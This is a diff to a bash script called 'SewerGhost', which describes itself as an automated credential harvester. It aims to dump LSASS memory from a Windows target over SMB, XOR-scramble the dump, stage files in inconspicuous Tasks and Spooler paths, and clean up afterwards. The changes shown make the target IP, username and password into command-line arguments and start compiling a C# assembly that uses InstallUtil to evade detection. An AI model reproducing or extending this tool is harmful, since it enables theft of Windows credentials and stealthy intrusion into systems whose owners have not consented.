@@ -1,5 +1,3 @@
-
-
 #!/bin/bash
 # ==============================================================================
 # SewerGhost - Automated Credential Harvester (InstallUtil Edition)
@@ -7,10 +5,16 @@
 # Goal: Stealthy LSASS dump, XOR scramble, and remote cleanup.
 # ==============================================================================
 
-# --- Configuration ---
-TARGET_IP="10.x.x.x"       # Change to Morthal or Whiterun IP
-SMB_USER="Administrator"
-SMB_PASS="Password123"
+# --- Argument Mapping ---
+TARGET_IP=$1
+SMB_USER=$2
+SMB_PASS=$3
+
+# Check if all arguments are provided
+if [ -z "$TARGET_IP" ] || [ -z "$SMB_USER" ] || [ -z "$SMB_PASS" ]; then
+    echo "Usage: ./sewer_ghost_inline.sh <IP> <User> <Pass>"
+    exit 1
+fi
 
 # Discrete Staging Paths
 # We move the EXE to Tasks and the LOOT to the Spooler directory from your screenshot
@@ -25,7 +29,7 @@ DECODED_DMP="lsass.dmp"
 XOR_KEY="0xDE 0xAD 0xBE 0xEF"
 
 echo "[*] --- Starting SewerGhost Operation ---"
-
+echo "[*] Target: $TARGET_IP | User: $SMB_USER"
 # 1. Compilation
 echo "[*] Phase 1: Compiling C# assembly with InstallUtil references..."
 mcs -out:$LOCAL_EXE $LOCAL_CS_FILE -r:System.Configuration.Install.dll
